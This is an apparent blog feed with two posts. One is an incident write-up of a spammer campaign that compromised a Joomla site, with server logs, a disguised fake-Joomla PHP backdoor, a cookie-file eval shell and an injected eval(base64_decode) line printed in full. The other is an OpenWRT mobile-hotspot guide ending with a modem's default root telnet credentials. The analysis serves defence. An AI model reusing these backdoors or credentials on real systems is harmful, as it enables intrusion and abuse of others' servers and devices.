<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Yinette's Webshite]]></title>
  <link href="http://yinette.github.io/atom.xml" rel="self"/>
  <link href="http://yinette.github.io/"/>
  <updated>2014-07-31T18:09:48+10:00</updated>
  <id>http://yinette.github.io/</id>
  <author>
    <name><![CDATA[Yinette]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[I59 - a Story of Spammers]]></title>
    <link href="http://yinette.github.io/blog/2014/07/31/i59-a-story-of-spammers/"/>
    <updated>2014-07-31T17:52:30+10:00</updated>
    <id>http://yinette.github.io/blog/2014/07/31/i59-a-story-of-spammers</id>
    <content type="html"><![CDATA[<h2>i59 &ndash; a story of spammers, pornography, and really old joomla exploits</h2>

<p>Last year, there was a similar campaign also using Joomla sites as well as Wordpress to send spam. It was officially known as &ldquo;Rodecap&rdquo;,
you can find a good write up on it here: <a href="http://www.abuse.ch/?tag=rodecap">http://www.abuse.ch/?tag=rodecap</a>
What made it unusual was that the IPs that were hitting the Malicious PHP script were in fact infected Windows boxes.
This one, which I&rsquo;m calling i59 (due to absence of any other name) appears to be the replacement for our old friend rodecap. It&rsquo;s called i59 due to the extensive use of the $i59 variable within the script.</p>

<p>This was mostly uncovered using log diving, grep, and a shitload of caffeine.</p>

<p>Please note the filenames here are what I discovered in this particular instance of an i59 infection. It seems each case has a different place where things are stored, named, etc.</p>

<p>Anything i&rsquo;ve got wrong, please let me know! I&rsquo;ve had very ample time to properly look into this&hellip;</p>

<h2>The story begins, initial vector</h2>

<p>It appears that this all started around the 24/25th of May 2014, the exploit in question is this one: <a href="http://www.exploit-db.com/exploits/17995/">http://www.exploit-db.com/exploits/17995/</a> &ndash; From my research, it looks like this has already been patched by the nonumber developer.</p>

<pre>
188.208.33.18 - - [24/May/2014:03:25:01 +1000] "POST /index.php?nn_qp=1&url=http://5.34.177.110/about/ HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20130101 Firefox/10.0"
188.208.33.18 - - [24/May/2014:03:25:04 +1000] "POST /index.php?nn_qp=1&url=http://www.nonumber.nl/about/ HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20130101 Firefox/10.0"
188.208.33.18 - - [24/May/2014:03:25:06 +1000] "POST /components/a.php HTTP/1.1" 200 143 "-" "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20130101 Firefox/10.0"
188.208.33.18 - - [24/May/2014:03:25:08 +1000] "GET /components/4idf49.php HTTP/1.1" 200 62084 "-" "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20130101 Firefox/10.0"
</pre>


<p>The IP <code>5.34.177.110</code> doesn&rsquo;t respond to anything at the moment. Either it was withdrawn or destroyed, but the IP belongs to a Hosting mob from Ukraine, to be specific, the town of Kharkiv. This looks as if it would have had the remote shell, however without the full POST data I cannot tell for sure.</p>

<p>Secondly, our First actor <code>188.208.33.18</code> from Romania is always the IP that injects and establishes the foothold on the Joomla site it has infected.</p>

<p>The first thing it puts on the site is a basic PHP script that can be used to gather some information:</p>

<p>md5: 305038e2f82471a683ccdd71078a02d9</p>

<pre><code># Netscape HTTP Cookie File
# http://curl.haxx.se/rfc/cookie_spec.html
# This file was generated by libcurl! Edit at your own risk.

5.34.177.110    FALSE   /about/ FALSE   0       &lt;?eval(stripslashes(array_pop($_POST)))&gt;       1
</code></pre>

<p>Seems to also carry some meta-data.</p>

<p>From there it will have already uploaded the next stage:</p>

<p>md5: ad354405da14c4cdc5957cc84bc2ee49</p>

<pre><code>/**
 * @package     Joomla.Plugin.System
 * @since       1.5
 *
 *
 */
class PlgSysJoomla {
public function __construct() {
$file=@$_COOKIE['Jlma3'];
if ($file){ $opt=$file(@$_COOKIE['Jlma2']); $au=$file(@$_COOKIE['Jlma1']); $opt("/292/e",$au,292); die();} else {phpinfo();die;}}}
</code></pre>

<p>Sneaky fecker pretends to be a part of Joomla. Romania&rsquo;s role here is to just make sure it returns the phpinfo&hellip;</p>

<p>About a week later, Romania comes back and throws some stuff at our fake joomla component:</p>

<pre>
188.208.33.18 - - [06/Jul/2014:21:45:47 +1000] "POST /components/4idf49.php HTTP/1.1" 200 70 "http://www.google.com" "Mozilla/7.0 (Windows XP 6.1; rv:12.1) Gecko/2014 Firefox/11.1"
</pre>


<p>This is where the next file is born&hellip;</p>

<p>md5sum: 7fdd8a13ae5c0a3ee2713e8c3ddf39d4</p>

<p>Look at the attached file &lsquo;395adn.php&rsquo;</p>

<p>I haven&rsquo;t had time to properly dissect this, but I&rsquo;m sure someone out there would like to.
Mostly from inference, guessing and experience, this appears to be a webshell and a file uploader.</p>

<p>From here, there is a bit of silence, It&rsquo;s possible that this was just the foothold that would be sold-on to whoever wanted a lot of joomla sites to do naughty things with&hellip; Might be interesting to see what sort of chatter was going on in the Russian cybercrim forums around this time.</p>

<h3>So a month later, we meet a new actor:</h3>

<pre>
37.139.47.122 - - [07/Jul/2014:22:06:04 +1000] "GET /components/com_podcastmedia/395adn.php HTTP/1.1" 200 106 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
37.139.47.122 - - [07/Jul/2014:22:06:06 +1000] "POST /components/com_podcastmedia/395adn.php HTTP/1.1" 200 2214 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
37.139.47.122 - - [07/Jul/2014:22:06:09 +1000] "POST /components/com_podcastmedia/395adn.php HTTP/1.1" 200 3360 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
</pre>


<p>our friend <code>37.139.47.122</code> is from St. Petersburg Russia.</p>

<p>He immediately will upload his back doors, as well as spread a whole bunch of shit around. I like to call this the &lsquo;arse spraying mayhem&rsquo;</p>

<pre>

37.139.47.122 - - [07/Jul/2014:22:06:23 +1000] "POST /libraries/getid3/module.audio.bonk.php HTTP/1.1" 200 45 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
37.139.47.122 - - [07/Jul/2014:22:06:27 +1000] "POST /modules/mod_banners/mod_banners.php HTTP/1.1" 200 45 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
37.139.47.122 - - [07/Jul/2014:22:06:41 +1000] "POST /modules/mod_articles_archive/mod_articles_archive.php HTTP/1.1" 200 45 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
37.139.47.122 - - [07/Jul/2014:22:06:54 +1000] "POST /components/com_banners/models/search.php HTTP/1.1" 200 45 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
37.139.47.122 - - [07/Jul/2014:22:06:56 +1000] "POST /libraries/fof/toolbar/sql.php HTTP/1.1" 200 45 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
37.139.47.122 - - [07/Jul/2014:22:06:58 +1000] "POST /libraries/cms/view/db.php HTTP/1.1" 200 45 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
37.139.47.122 - - [07/Jul/2014:22:07:00 +1000] "POST /components/com_sh404sef/system.php HTTP/1.1" 200 45 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
37.139.47.122 - - [07/Jul/2014:22:07:02 +1000] "POST /media/mediaelements/js/list.php HTTP/1.1" 200 45 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
37.139.47.122 - - [07/Jul/2014:22:07:04 +1000] "POST /libraries/joomla/installer/ajax.php HTTP/1.1" 200 45 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
37.139.47.122 - - [07/Jul/2014:22:07:06 +1000] "POST /media/editors/codemirror/object.php HTTP/1.1" 200 45 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
37.139.47.122 - - [07/Jul/2014:22:07:08 +1000] "POST /components/com_k2/controllers/title.php HTTP/1.1" 200 45 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
37.139.47.122 - - [07/Jul/2014:22:07:10 +1000] "POST /modules/mod_feed/tmpl/help.php HTTP/1.1" 200 45 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
37.139.47.122 - - [07/Jul/2014:22:07:12 +1000] "POST /components/com_mailto/helpers/alias.php HTTP/1.1" 200 45 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
37.139.47.122 - - [07/Jul/2014:22:07:14 +1000] "POST /components/com_content/controllers/sql.php HTTP/1.1" 200 45 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
37.139.47.122 - - [07/Jul/2014:22:07:16 +1000] "POST /plugins/search/contacts/menu.php HTTP/1.1" 200 45 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
37.139.47.122 - - [07/Jul/2014:22:07:18 +1000] "POST /media/system/css/proxy.php HTTP/1.1" 200 45 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
37.139.47.122 - - [07/Jul/2014:22:07:20 +1000] "POST /components/com_jce/options.php HTTP/1.1" 200 45 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
37.139.47.122 - - [07/Jul/2014:22:07:23 +1000] "POST /modules/mod_footer/tmpl/gallery.php HTTP/1.1" 200 45 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
37.139.47.122 - - [07/Jul/2014:22:07:25 +1000] "POST /templates/view.php HTTP/1.1" 200 45 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
37.139.47.122 - - [07/Jul/2014:22:07:27 +1000] "POST /components/com_mailto/themes.php HTTP/1.1" 200 45 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
37.139.47.122 - - [07/Jul/2014:22:07:31 +1000] "POST /logs/menu.php HTTP/1.1" 200 45 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
37.139.47.122 - - [07/Jul/2014:22:07:33 +1000] "POST /libraries/phputf8/utils/page.php HTTP/1.1" 200 45 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
</pre>


<p>POSTs are to confirm everything is there and working.</p>

<p>This basically puts this into a bunch of files, as well as into the top of some already existing files:</p>

<pre>
eval(base64_decode($_POST['ne0080b']));
</pre>


<p>Effectively giving this bot leverage to execute arbitrary PHP from any of it&rsquo;s several &lsquo;mini backdoors&rsquo;</p>

<p>This IP will also be responsible for maintaining the bot, and making sure that it can still get in.</p>

<p>I&rsquo;ve also observed this thing messing with file modification times, so it was kinda tricky to properly link this all together.</p>

<h3>a few days pass&hellip;</h3>

<pre>
37.139.47.243 - - [11/Jul/2014:06:45:48 +1000] "POST /libraries/fof/toolbar/sql.php HTTP/1.1" 200 185 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
</pre>


<p>This is where the star of the show is born&hellip; i59!</p>

<p>md5sum: 71a7c769e644d8cf3cf32419239212c7</p>

<p>again, i59 is something I haven&rsquo;t had the time to properly dissect, even though it is the star of the show, it&rsquo;s kept me more busy trying to track its ass down and stop the machine it has infected from being RBL&rsquo;d for trying to spam Porno links to everyone on AOL and Yahoo.</p>

<p>But this is the component that sends the spam, as evident in the following log snippet:</p>

<pre>
66.33.212.107 - - [25/Jul/2014:02:53:20 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 500 1062 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
210.48.148.152 - - [25/Jul/2014:02:58:57 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 200 2528 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
210.48.148.152 - - [25/Jul/2014:02:59:10 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 200 2558 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
210.48.148.152 - - [25/Jul/2014:02:59:22 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 200 2577 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
210.48.148.152 - - [25/Jul/2014:02:59:34 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 200 3301 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
210.48.148.152 - - [25/Jul/2014:02:59:43 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 500 1062 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
69.89.31.184 - - [25/Jul/2014:03:08:30 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 200 1614 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
69.89.31.184 - - [25/Jul/2014:03:08:48 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 500 1062 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
91.121.12.223 - - [25/Jul/2014:03:09:48 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 500 1062 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
77.222.61.150 - - [25/Jul/2014:03:10:38 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 200 5164 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
77.222.61.150 - - [25/Jul/2014:03:10:49 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 200 4871 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
77.222.61.150 - - [25/Jul/2014:03:10:57 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 200 4667 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
77.222.61.150 - - [25/Jul/2014:03:11:08 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 200 5132 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
77.222.61.150 - - [25/Jul/2014:03:11:16 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 500 1062 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
74.220.219.67 - - [25/Jul/2014:03:13:10 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 500 1062 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
77.222.56.213 - - [25/Jul/2014:03:14:51 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 500 1062 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
77.222.61.243 - - [25/Jul/2014:03:16:37 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 200 1058 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
77.222.61.243 - - [25/Jul/2014:03:16:49 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 500 1062 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
66.147.244.240 - - [25/Jul/2014:03:19:34 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 200 3203 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
66.147.244.240 - - [25/Jul/2014:03:19:47 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 500 1062 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
192.217.112.247 - - [25/Jul/2014:03:21:22 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 200 3457 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
192.217.112.247 - - [25/Jul/2014:03:21:32 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 200 3188 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
192.217.112.247 - - [25/Jul/2014:03:21:42 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 200 3683 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
192.217.112.247 - - [25/Jul/2014:03:21:54 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 200 3975 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
192.217.112.247 - - [25/Jul/2014:03:22:08 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 200 2912 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
192.217.112.247 - - [25/Jul/2014:03:22:17 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 500 1062 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
66.147.244.153 - - [25/Jul/2014:03:24:02 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 200 2302 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
92.53.106.199 - - [25/Jul/2014:03:29:24 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 200 3912 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
92.53.106.199 - - [25/Jul/2014:03:29:44 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 200 2899 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
92.53.106.199 - - [25/Jul/2014:03:30:13 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 200 3209 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
92.53.106.199 - - [25/Jul/2014:03:30:32 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 200 3394 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
69.16.199.30 - - [25/Jul/2014:03:35:19 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 200 2509 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
69.16.199.30 - - [25/Jul/2014:03:35:27 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 500 1062 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
199.168.99.123 - - [25/Jul/2014:03:36:12 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 500 1062 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
141.105.121.139 - - [25/Jul/2014:03:41:00 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 500 1062 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
66.147.244.245 - - [25/Jul/2014:03:42:32 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 200 3196 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
66.147.244.245 - - [25/Jul/2014:03:42:45 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 500 1062 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
192.145.239.8 - - [25/Jul/2014:03:46:24 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 200 4799 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
192.145.239.8 - - [25/Jul/2014:03:46:34 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 200 3894 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
192.145.239.8 - - [25/Jul/2014:03:47:13 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 200 2186 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
192.145.239.8 - - [25/Jul/2014:03:47:31 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 200 1673 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
192.145.239.8 - - [25/Jul/2014:03:47:50 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 200 2219 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
192.145.239.8 - - [25/Jul/2014:03:48:01 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 200 2142 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
192.145.239.8 - - [25/Jul/2014:03:48:31 +1000] "POST /media/mod_languages/list.php HTTP/1.1" 500 1062 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"
</pre>


<p>Why some of these are getting 500s, i&rsquo;m not sure&hellip; It could be the server&rsquo;s load or a problem in the i59 script itself&hellip; Either way it was filling up mailqueue with annoying filth.</p>

<p>UPDATE:
The 500&rsquo;s seem to be caused by me setting restrictive facls on the postfix binary, lol!</p>

<pre>
[Fri Jul 25 04:13:09 2014] [error] [client 184.107.157.218] sh: /usr/sbin/sendmail: Permission denied
[Fri Jul 25 04:13:09 2014] [error] [client 184.107.157.218] sh: /usr/sbin/sendmail: Permission denied
[Fri Jul 25 04:13:09 2014] [error] [client 184.107.157.218] sh: /usr/sbin/sendmail: Permission denied
[Fri Jul 25 04:13:09 2014] [error] [client 184.107.157.218] sh: /usr/sbin/sendmail: Permission denied
</pre>


<p>Trololololololololol</p>

<p>All communications of i59 are done with the same User-Agent: <code>"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)"</code></p>

<p>This is where I draw the parallel to Rodecap. I&rsquo;m unsure what these IPs are, if they&rsquo;re compromised machines or what. But they supply the spam in encrypted payloads.</p>

<p>balls&hellip; will have to find a format that gist doesn&rsquo;t shit its pants over&hellip;</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Project AWACS]]></title>
    <link href="http://yinette.github.io/blog/2014/07/31/project-awacs/"/>
    <updated>2014-07-31T17:49:24+10:00</updated>
    <id>http://yinette.github.io/blog/2014/07/31/project-awacs</id>
    <content type="html"><![CDATA[<h2>Project AWACS</h2>

<p><img src="http://upload.wikimedia.org/wikipedia/commons/9/9a/Boeing_E-3_Sentry_LX-N_90454-3.JPG" alt="E3 Sentry AWACS" />
(image from Wikipedia)</p>

<p>I had a requirement for 4G on the go that doesn&rsquo;t cost me $40,000,000 a year to run&hellip; Telstra&rsquo;s Voice and Data Pre-Paid sucks for price.</p>

<p>I wanted something I could use on the way to and from work, and whenever I was out. Something that was low-power and could sit in my bag.</p>

<h3>Why AWACS?</h3>

<p>I have massive planespergers&hellip; From wikipedia:</p>

<p>AWACS or Airborne Warning and Control System is an airborne radar picket system designed to detect aircraft,
ships and vehicles at long ranges and perform control and command of the battle space in an air engagement by directing fighter and
attack aircraft strikes.</p>

<p>I usually name my Wireless stuff after Airforce related things, Such as TACAMO (TAke COmmand And Move Out &ndash; Nuclear war survivable communications) for my Mobile Phone tether, and Callsigns for static Access Points, such as &ldquo;Mainsail&rdquo; and &ldquo;Skyking&rdquo;</p>

<h3>The Setup:</h3>

<p><img src="http://yinette.beta.anchortrove.com/IMG_20140730_150239.jpg" alt="Hardware!" /></p>

<p><strong>1x TP-Link TL-MR3020 Mobile Access Point</strong> &ndash; <a href="http://wiki.openwrt.org/toh/tp-link/tl-mr3020">http://wiki.openwrt.org/toh/tp-link/tl-mr3020</a>
  &ndash; Atheros AR7240 MIPS Processor @ 400MHz
  &ndash; 32M RAM
  &ndash; 4M Flash (yes, very tight&hellip;)
  &ndash; 1x USB, 1x Mini-USB (for power input)
  &ndash; 1x 10/100 Ethernet (for un-fucking with ThinkPad)</p>

<p><strong>1x ZTE MF823 LTE/UMTS USB Modem</strong> &ndash; <a href="http://zte.com.au/telstra/MF823.htm">http://zte.com.au/telstra/MF823.htm</a>
  &ndash; Has an ARMv7 SoC and runs a Linux Kernel as I found out. (Had root on it less than 10 minutes after it being delivered)</p>

<p><strong>1x Mini-Gorilla Battery Pack.</strong> <a href="https://www.powertraveller.com/en/shop/portable-chargers/professional/minigorilla/">https://www.powertraveller.com/en/shop/portable-chargers/professional/minigorilla/</a></p>

<p>So, firstly, I needed to Install OpenWRT on the TP-Link, this was fairly straight forward with the trunk versions known as Barrier Breaker. TP-Link are bros that don&rsquo;t dick you around in giving access to the hardware you own, so it was as simple as feeding it OpenWRT as a Firmware Upgrade via the Web Interface :)</p>

<p>Once installed, I opkg&rsquo;d the niceties and requirements after getting it connected up to my work&rsquo;s non-priveleged wireless :3</p>

<pre><code>opkg update; opkg install ip kmod-usb-net kmod-usb-net-rndis kmod-usb-net-cdc-ether usbutils udev
</code></pre>

<p>This will get you the nice new IP tools, as well as all the kernel modules and software required to tether to the ZTE Modem (Which will present itself like an Ethernet Adaptor over USB)</p>

<p>Once Telstra was kind enough to deliver my USB Modem (ok, it wasn&rsquo;t that bad) I registered it up, and put on 10G that will stay active for 90 days, none of this 30 day bullshit with voice and data. You pay more up-front, but it will last you.</p>

<p>Once all together, we tell the AP what to do:</p>

<p>Since we cannot fit a web interface or let alone luci on this bee&rsquo;s dick of a flash storage, we need to use the OpenWRT CLI configuration utility <code>uci</code></p>

<p>(Alternatively, you can edit shit directly in <code>/etc/config/network</code>)</p>

<pre><code>uci set wireless.@wifi-iface[0]=wifi-iface
uci set wireless.@wifi-iface[0].device=radio1
uci set wireless.@wifi-iface[0].mode=ap
uci set wireless.@wifi-iface[0].network=wan
uci set wireless.@wifi-iface[0].key=&lt;GOOD PASSPHRASE&gt;
uci set wireless.@wifi-iface[0].ssid=&lt;AN SSID&gt; (i use AWACS)
uci set wireless.@wifi-iface[0].encryption=psk2+ccmp
</code></pre>

<p>once satisfied, commit changes.</p>

<p><code>uci commit</code></p>

<p>Following this will get your USB Tether up and going &ndash; <a href="http://wiki.openwrt.org/doc/howto/usb.tethering">http://wiki.openwrt.org/doc/howto/usb.tethering</a></p>

<p>the tl;dr:</p>

<pre><code>uci del network.wan
uci set network.wan=interface
uci set network.wan.ifname=usb0
uci set network.wan.proto=dhcp
uci commit network
</code></pre>

<p>and</p>

<pre><code>ifup wan
</code></pre>

<h3>How does it go?</h3>

<p>Overall, I&rsquo;m very impressed how it has turned out. Even in a city like Sydney where the 2.4GHz spectrum is literally shitted with Access Points, the close-proximity and power output make this more of a Piconet. People sitting directly next to you or around you on a bus or train will be able to use this without packet loss.</p>

<p>Internet access is very reliable, at around Lunch Time in the Sydney CBD (Heavy use period) I got 21 Mbps down and 17 Mbps up on 4G/LTE.</p>

<p>I&rsquo;ve now used it more than a few occasions (Two without modem, one with) and I still have not dropped a Bar of Energy on the Gorilla. This is one Power Efficient setup, let me tell you.</p>

<p>What did impress me was the ability to reach the USB Dongle&rsquo;s management interfaces still.</p>

<p>The USB Dongle will by default make a network of <code>192.168.0.0/24</code>, whereas OpenWRT will have <code>192.168.1.0/24</code>, you can reach the modem still on <code>192.168.0.1</code></p>

<p>Protip:</p>

<p>The ZTE MF823 has Telnet open, here&rsquo;s the creds:</p>

<pre><code>USER: root
PASS: zte9x15
</code></pre>

<p>It has a pretty decent Busybox on it too.</p>

<h3>Weird Quirks</h3>

<p>Sometimes, the USB modem won&rsquo;t show up unless you plug it in after the AP boots. If this happens, just do so and run <code>ifup wan</code> from a root shell on the AP, everything will take care of itself from there.</p>
]]></content>
  </entry>
  
</feed>
